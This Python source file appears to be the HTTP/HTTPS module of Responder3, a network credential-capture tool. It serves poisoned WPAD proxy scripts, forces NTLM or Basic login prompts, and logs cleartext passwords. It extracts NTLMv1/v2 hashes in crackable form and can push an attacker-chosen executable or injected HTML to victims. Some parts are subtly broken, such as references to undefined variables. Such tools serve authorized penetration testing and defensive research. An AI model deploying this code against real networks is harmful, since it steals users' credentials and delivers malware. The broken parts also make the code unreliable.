import traceback
import struct
from base64 import b64decode
import logging
from responder3.servers.BASE import ResponderServer, ResponderProtocolTCP

from responder3.utils import *
from responder3.packets import NTLM_Challenge
from responder3.packets import IIS_Auth_401_Ans, IIS_Auth_Granted, IIS_NTLM_Challenge_Ans, IIS_Basic_401_Ans,WEBDAV_Options_Answer
from responder3.packets import WPADScript, ServeExeFile, ServeHtmlFile


class HTTPProtocol(ResponderProtocolTCP):
	
	def __init__(self, server):
		ResponderProtocolTCP.__init__(self, server)

	def _connection_made(self, transport):
		self._server.challenge = self._server.RandomChallenge()

	def _data_received(self, raw_data):
		return

	def _connection_lost(self, exc):
		return

	def _parsebuff(self):
		if len(self._buffer) >= self._buffer_maxsize:
			raise Exception('Input data too large!')

		if self._request_data_size == len(self._buffer):
			#we have recieved all data for the request, and the request contained body data
			self._parsereq()
		
		if self._buffer.find('\r\n\r\n') == -1:
			return
		
		#we did, now to check if there was anything else in the request besides the header
		if self._buffer.find('Content-Length') == -1:
			#request contains only header
			self._parsereq()
			
		else:
			#searching for that content-length field in the header
			for line in self._buffer.split('\r\n'):
				if line.find('Content-Length') != -1:
					line = line.strip()
					self._request_data_size = int(line.split(':')[1].strip()) - len(self._buffer)
		
	def _parsereq(self):
		_httpreq = HTTPReq()
		_httpreq.parse(self._buffer)
		self._buffer = ''
		
		self._server.handle(_httpreq, self._transport)

class HTTPAuthorization():
	def __init__(self):
		self.type = ''
		self.data = ''

	def parse(self, t):
		marker = t.find(' ')
		if marker == -1:
			raise Exception('Header parsing error!' + repr(line))

		self.type = t[:marker]
		self.data = t[marker+1:]

	def toDict(self):
		t = {}
		t['type'] = self.type
		t['data'] = self.data
		return t

class HTTPReq():
	"""
	HEADER KEYS ARE ALL LOWER CASE!!!
	"""
	def __init__(self):
		self.rawdata = ''
		self.method = ''
		self.uri = ''
		self.version = ''
		self.headers = {}
		self.data = None

		self.authorization = None

		self.isWebDAV = False
		self.isFirefox = False
		self.isWpad = False

	def parse(self, data):
		self.rawdata = data
		header, self.data = self.rawdata.split('\r\n\r\n')

		request = ''
		first = True
		for line in header.split('\r\n'):
			if first:
				request = line
				first = False
				continue

			marker = line.find(':')
			if marker == -1:
				raise Exception('Header parsing error!' + repr(line))
			
			self.headers[line[:marker].strip().lower()] = line[marker+1:].strip()

		self.method, self.uri, self.version = request.split(' ')

		if self.uri.endswith('wpad.dat') or self.uri.endswith('.pac'):
			self.isWpad = True

		if self.method == 'PROPFIND':
			self.isWebDAV = True

		if 'user-agent' in self.headers:
			if self.headers['user-agent'].find('Firefox') != -1:
				self.isFirefox = True

		if 'authorization' in self.headers:
			self.authorization = HTTPAuthorization()
			self.authorization.parse(self.headers['authorization'])

	def toDict(self):
		t = {}
		t['method'] = self.method
		t['uri'] = self.uri
		t['version'] = self.version
		t['headers'] = self.headers
		t['authorization'] = self.authorization
		if t['authorization'] is not None:
			t['authorization'] = self.authorization.toDict()

		t['isWebDAV'] = self.isWebDAV
		t['isFirefox'] =  self.isFirefox
		t['isWpad'] = self.isWpad
		return t
	def toJSON(self):
		return json.dumps(self.toDict())

	def __str__(self):
		return self.toJSON()




class HTTP(ResponderServer):
	def __init__(self):
		ResponderServer.__init__(self)
		self.protocol = HTTPProtocol
		self.challenge = None

	def modulename(self):
		return 'HTTP'

	def handle(self, request, transport):
		#self.log(logging.DEBUG, 'Handling request %s' % str(request))

		try:
			if request.isWpad:
				if request.isFirefox:
					self.log(logging.INFO,"WARNING! Mozilla doesn't switch to fail-over proxies (as it should) when one's failing.")
					self.log(logging.INFO,"WARNING! The current WPAD script will cause disruption on this host. Sending a dummy wpad script (DIRECT connect)")


				Buffer = self.WpadCustom(request)

				if self.settings['Force_WPAD_Auth'] == False:
					transport.write(Buffer)
					self.log(logging.ERROR, 'WPAD (no auth) file sent')
					return
			else:
				Buffer = self.PacketSequence(request, transport)
				#self.log(logging.DEBUG, 'Response: ' + Buffer.decode())
				transport.write(Buffer)
				return

		except Exception as e:
			self.log(logging.INFO,'Exception! %s' % (str(e),))
			traceback.print_exc()
			return

	def RandomChallenge(self):
		if self.settings['NumChal'] == "random":
			from random import getrandbits
			NumChal = '%016x' % getrandbits(16 * 4)
			Challenge = b''
			for i in range(0, len(NumChal),2):
				Challenge += bytes.fromhex(NumChal[i:i+2])
			return Challenge
		else:
			return bytes.fromhex(self.settings['Challenge'])

	def WpadCustom(self, request):
		if request.isWpad:
			if request.isFirefox:
				Buffer = WPADScript(Payload=b"function FindProxyForURL(url, host){return 'DIRECT';}")
				Buffer.calculate()
				return Buffer.getdata()

			else:
				Buffer = WPADScript(Payload=settings.Config.WPAD_Script.encode('ascii'))
				Buffer.calculate()
				return Buffer.getdata()
		
		return False
	
	
	# Handle HTTP packet sequence.
	def PacketSequence(self, request, transport):
		# Serve the .exe if needed
		if self.settings['Serve_Always'] is True or (self.settings['Serve_Exe'] is True and re.findall('.exe', data)):
			return self.RespondWithFile(self.settings['Exe_Filename'], self.settings['Exe_DlName'])

		# Serve the custom HTML if needed
		if self.settings['Serve_Html']:
			return self.RespondWithFile(self.settings['Html_Filename'])

		WPAD_Custom = self.WpadCustom(request)
		# Webdav
		if request.method == 'OPTIONS':
			Buffer = WEBDAV_Options_Answer()
			return Buffer.getdata(),

		if request.authorization is not None:
			if request.authorization.type == 'NTLM':


				Packet_NTLM = b64decode(''.join(request.authorization.data))[8:9]
				self.log(logging.DEBUG,"Challenge 2: %s" % self.challenge.hex())
				if Packet_NTLM == b"\x01":

					#Buffer = NTLM_Challenge(ServerChallenge=self.challenge, TargetNameStr = b'SMB', Av3Str=b'56k.io', Av4Str=b'creds.56k.io',Av5Str=b'56k.io')
					Buffer = NTLM_Challenge(ServerChallenge=self.challenge)
					Buffer.calculate()

					Buffer_Ans = IIS_NTLM_Challenge_Ans()
					Buffer_Ans.calculate(Buffer.getdata())
					return Buffer_Ans.getdata()

				if Packet_NTLM == b"\x03":
					NTLM_Auth = b64decode(''.join(request.authorization.data))
					if request.isWebDAV:
						module = "WebDAV"
					else:
						module = "HTTP"
					self.ParseHTTPHash(NTLM_Auth, module)

				if self.settings['Force_WPAD_Auth'] and WPAD_Custom:
					self.log(logging.INFO, 'WPAD (auth) file sent') 
					return WPAD_Custom
				else:
					Buffer = IIS_Auth_Granted(Payload=self.settings['HtmlToInject'].encode())
					Buffer.calculate()
					return Buffer.getdata()

			elif request.authorization.type == 'Basic':
				ClearText_Auth = b64decode(''.join(request.authorization.data)).decode()
				#log http req?

				self.logResult({
					'module': 'HTTP', 
					'type': 'Basic', 
					'client': self.peername, 
					'user': ClearText_Auth.split(':')[0], 
					'cleartext': ClearText_Auth.split(':')[1], 
				})

				if self.settings['Force_WPAD_Auth'] and WPAD_Custom:
					self.log(logging.INFO, 'WPAD (auth) file sent') 
					return WPAD_Custom
				else:
					Buffer = IIS_Auth_Granted(Payload=self.settings['HtmlToInject'].encode())
					Buffer.calculate()
					return Buffer.getdata()
		else:
			if self.settings['Basic']:
				Response = IIS_Basic_401_Ans()
				self.log(logging.INFO, 'Sending BASIC authentication request') 

			else:
				Response = IIS_Auth_401_Ans()
				self.log(logging.INFO, 'Sending NTLM authentication request') 

			return Response.getdata()

	def RespondWithFile(self, filename, dlname=None):

		if filename.endswith('.exe'):
			Buffer = ServeExeFile(Payload = self.ServeFile(filename), ContentDiFile=dlname)
		else:
			Buffer = ServeHtmlFile(Payload = self.ServeFile(filename))

		Buffer.calculate()
		self.log(logging.INFO, "Sending file %s to %s" % (filename, self.client))
		return Buffer.getdata()


	# Parse NTLMv1/v2 hash.
	#data, Challenge, client, module
	def ParseHTTPHash(self, data, module):
		LMhashLen    = struct.unpack('<H',data[12:14])[0]
		LMhashOffset = struct.unpack('<H',data[16:18])[0]
		LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen].hex().upper()

		NthashLen    = struct.unpack('<H',data[20:22])[0]
		NthashOffset = struct.unpack('<H',data[24:26])[0]
		NTHash       = data[NthashOffset:NthashOffset+NthashLen].hex().upper()

		UserLen      = struct.unpack('<H',data[36:38])[0]
		UserOffset   = struct.unpack('<H',data[40:42])[0]
		User         = data[UserOffset:UserOffset+UserLen].replace(b'\x00',b'').decode()

		if NthashLen == 24:
			HostNameLen     = struct.unpack('<H',data[46:48])[0]
			HostNameOffset  = struct.unpack('<H',data[48:50])[0]
			HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].replace(b'\x00',b'').decode()
			WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, self.challenge.hex())
			self.logResult({
				'module': module, 
				'type': 'NTLMv1', 
				'client': self.peername, 
				'host': HostName, 
				'user': User, 
				'hash': LMHash+":"+NTHash, 
				'fullhash': WriteHash,
			})

		if NthashLen > 24:
			NthashLen      = 64
			DomainLen      = struct.unpack('<H',data[28:30])[0]
			DomainOffset   = struct.unpack('<H',data[32:34])[0]
			Domain         = data[DomainOffset:DomainOffset+DomainLen].replace(b'\x00',b'').decode()
			HostNameLen    = struct.unpack('<H',data[44:46])[0]
			HostNameOffset = struct.unpack('<H',data[48:50])[0]
			HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace(b'\x00',b'').decode()
			WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, self.challenge.hex(), NTHash[:32], NTHash[32:])
 
			self.logResult({
				'module': module, 
				'type': 'NTLMv2', 
				'client': self.peername, 
				'host': HostName, 
				'user': Domain + '\\' + User,
				'hash': NTHash[:32] + ":" + NTHash[32:],
				'fullhash': WriteHash,
			})

	def ServeFile(self, Filename):
		with open (Filename, "rb") as bk:
			return bk.read()


class HTTPS(HTTP):
	def modulename(self):
		return 'HTTPS'

